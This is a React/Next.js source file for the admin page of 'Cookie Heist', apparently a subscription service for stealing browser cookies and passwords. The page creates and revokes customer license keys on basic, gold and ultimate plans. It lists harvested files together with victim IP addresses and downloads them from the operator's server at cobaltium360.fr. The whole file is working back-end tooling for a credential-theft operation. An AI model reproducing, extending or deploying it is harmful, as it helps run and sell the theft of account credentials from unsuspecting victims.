import Head from 'next/head'
import Header from '../components/header'
import { instance } from "../axios"
import { useState, useEffect } from 'react';
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faTrash, faCheck, faFileArrowDown } from "@fortawesome/free-solid-svg-icons"
import Loading from '../components/loading';
import JsFileDownloader from 'js-file-downloader';
import Mobile from '../components/mobile';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
export default function Admin() {

    const [key, setKey] = useState('')
    const [plan, setPlan] = useState('basic')
    const [data, setData] = useState(null)
    const [isLoading, setLoading] = useState(false)
    const [addTime, setAddtime] = useState('1 mois')
    const [file, setFile] = useState(null)
    const [token, setToken] = useState(null)

    useEffect(() => {
        setLoading(true)
        instance.get('/alluser').then(res => {
            setData(res.data)
            setToken(localStorage.getItem("token"))
            instance.get('/allfile').then(res => {
                setFile(res.data)
                setLoading(false)
            }).catch()
        
        }).catch()
        

    }, [])

    if (isLoading) return <Loading />
    const handleChangeKey = (event) => {
        setKey(event.target.value)
    }

    function notifyerr(a){
        toast.error(`${a}`);
    }
    function notifysucces(a){
        toast.success(`${a}`);
    }

    function newkey() {
        instance.post(`/key`, { key: key, plan: plan })
            .then(res => {
                
                setLoading(true)
                instance.get('/alluser').then(res => {
                    setData(res.data)
                    setLoading(false)
                }).catch()
            })
            .catch(err => {notifyerr("un probleme est survenue merci de réessayer")})
    }
    function removekey(a) {
        instance.put('/removekey/' + a).then(res => {
            
            setLoading(true)
            instance.get('/alluser').then(res => {
                setData(res.data)
                
                setLoading(false)
            }).catch()

        }).catch(err => {notifyerr("un probleme est survenue merci de réessayer")})
    }

    function addtime(a) {
        instance.post('/addtime/' + a, { add: addTime }).then(res => {
            
            setLoading(true)
            instance.get('/alluser').then(res => {
                setData(res.data)
                
                setLoading(false)
            }).catch()

        }).catch(err => {notifyerr("un probleme est survenue merci de réessayer")})
    }


    function download(a){
        new JsFileDownloader({ 
          url: `https://cobaltium360.fr:3001/api/download/${a}`,
          headers: [
            { name: 'Authorization', value: `Barear ${token}` }
          ],
          nameCallback : function ( name )  { 
            return name + ".txt"; 
          } 
        })
        
    }

    function Alluser() {
        if (data) {

            return (data.map(data2 => (
                <div key={data2.id} className='container_explain_cookie'>
                    <p className='explain_cookie'>{data2.key}</p>
                    <p className='explain_cookie'>{data2.expire}</p>
                    <p className='explain_cookie'>{data2.plan}</p>
                    {data2.user ? <p className='explain_cookie'>{data2.user.username}</p> : <p className='explain_cookie'>pas utiliser</p>}
                    <div className='explain_cookie_div'>
                        <FontAwesomeIcon className='admin_icon' onClick={() => removekey(data2.id)} icon={faTrash} />
                    </div>
                    <div className='explain_cookie_div'>
                        <select className='select_newkey' value={addTime} onChange={(e) => { setAddtime(e.target.value) }}>
                            <option value="1 mois">1 mois</option>
                            <option value="3 mois">3 mois</option>
                            <option value="lifetime">lifetime</option>
                        </select>
                        <FontAwesomeIcon className='admin_icon_valid' onClick={() => addtime(data2.id)} icon={faCheck} />
                    </div>

                </div>
            )))
        } else {
            return <p>aucun utilisateur</p>
        }
    }

    function Array(){
        if(file){
          return (
            file.map(file => (
              <div key={file.id} className='container_explain_cookie'>
                <p className='explain_cookie'>{file.filename}</p>
                <p className='explain_cookie'>{file.ip}</p>
                <FontAwesomeIcon className='explain_cookie_icon' onClick={() => download(file.id)} icon={faFileArrowDown}/>
                
              </div>
            ))
          )
        }else{
          return <p>Pas encore de cookies et passwords</p>
        }
      }

    return (
        <div>
            <Head>
                <title>Cookie Heist - Admin</title>
                <meta name="description" content="Cookie heist pour récuperer les cookies et password" />
                <link rel="icon" type="image/png" href="/icon.png" />
            </Head>
            <Header />
            <Loading />
            <Mobile/>
            <div class="container_admin">
                <div className='container_card_newkey'>
                    <div className='card_newkey'>
                        <div className='titre_newkey'>
                            <p>Create New Key</p>
                        </div>

                        <div className='container_inputnewkey'>
                            <div className='input_p_newkey'>
                                <p>Key</p>
                                <input type="text" className='input_newkey' value={key} onChange={handleChangeKey} />
                            </div>
                            <div className='input_p_newkey'>
                                <p>Plan</p>
                                <select className='select_newkey' value={plan} onChange={(e) => { setPlan(e.target.value); }}>
                                    <option value="basic">Basic</option>
                                    <option value="gold">Gold</option>
                                    <option value="ultimate">Ultimate</option>
                                </select>
                            </div>

                        </div>
                        <div className='div_btn_newkey'>
                            <div className='btn_newkey' onClick={newkey}>
                                <p>Create Key</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div className='card_key'>
                    <h2>All User :</h2>
                    <div className='container_explain_cookie'>
                        <p className='explain_cookie'>key</p>
                        <p className='explain_cookie'>expire</p>
                        <p className='explain_cookie'>plan</p>
                        <p className='explain_cookie'>username</p>
                        <p className='explain_cookie'>remove</p>
                        <p className='explain_cookie'>add time</p>
                    </div>
                    <Alluser />
                </div>
                <div className='card_key'>
                    <div className='container_explain_cookie'>
                        <p className='explain_cookie'>filename</p>
                        <p className='explain_cookie'>ip</p>
                        <p className='explain_cookie'>download</p>
                    </div>
                    <Array/>
                </div>
            </div>
            <ToastContainer position="bottom-right"/>
        </div>
    )
}
